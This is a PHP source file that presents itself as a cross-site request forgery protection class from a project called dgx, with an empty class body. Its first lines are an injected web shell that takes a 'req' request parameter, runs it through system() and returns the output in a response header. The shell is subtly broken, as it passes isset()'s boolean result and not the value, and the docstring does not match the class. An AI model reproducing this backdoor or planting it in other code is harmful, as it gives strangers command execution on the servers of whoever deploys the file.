<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
 * 	Cross-site Request Forgery Protection Class
 *	Copyright Dalegroup Pty Ltd 2012
 *	support@dalegroup.net
 *
 *  This class allows basic Add/Edit/Delete functions for any generic table
 *
 * @package     dgx
 * @author      Michael Dale <mdale@dalegroup.net>
 */

namespace sts;

class csrf_protection {

	function __construct() {
		

	}
}

?>